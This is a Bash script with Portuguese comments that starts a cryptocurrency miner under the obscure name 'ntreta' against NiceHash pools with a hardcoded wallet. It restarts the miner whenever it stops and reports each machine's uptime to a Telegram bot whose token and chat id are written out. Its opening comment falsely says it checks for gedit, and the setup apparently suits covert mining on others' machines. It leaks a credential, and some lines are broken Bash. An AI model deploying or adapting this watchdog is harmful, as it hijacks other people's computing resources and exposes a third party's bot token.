#!/bin/bash
# Verifica se o gedit está sendo executado
NOMEMAQUINA="$1";
#CARTEIRA="$2"
CARTEIRA="3LDNgeuUgSE8DL3paRb9mYRC56XpSdRhC2"
#./xtreta --donate-level 1 -o randomxmonero.eu.nicehash.com:3380 -u $CARTEIRA.$NOMEMAQUINA -p x -k -a rx/0 &
#sleep 1;
./ntreta -a ethash  -log -o stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 -u $CARTEIRA.$NOMEMAQUINA &
#apt install curl
timecount = 0
while true; do
	sleep 60;
	$((timecount += 1))
    UPHOUR="uptime | cut -d ',' -f 1 | tr -s ' ' | cut -d ' ' -f 4";
	#UPHOUR=$(eval $UPHOUR | cut -c1-5);
	UPHOUR=$(eval $UPHOUR);	
	
	clear
	#if pgrep "xtreta" > /dev/null
	#then
	#	echo "Executando - xtreta" $NOMEMAQUINA;
	#else
	#	echo "Parado - xtreta";
	#	./xtreta --donate-level 1 -o randomxmonero.eu.nicehash.com:3380 -u $CARTEIRA.$NOMEMAQUINA -p x -k -a rx/0 &
	#fi
	if [ $(($timecount%60)) != 0 ]; then
		echo "Esta a "$UPHOUR "ligada"
    else
		curl -X GET "https://api.telegram.org/bot1997481925:AAHzhKUZBLT3Yy744kGBQxnXE21AkxZgKj0/sendMessage?chat_id=318237432&text="$NOMEMAQUINA"%20esta%20ligada%20a%20"$UPHOUR;
    fi

	
	if pgrep "ntreta" > /dev/null
	then
		echo "Executando - ntreta" $NOMEMAQUINA;
	else
		echo "Parado - ntreta";
		./ntreta -a ethash  -log -o stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 -o1 stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -u $CARTEIRA.$NOMEMAQUINA &
	fi	
	
done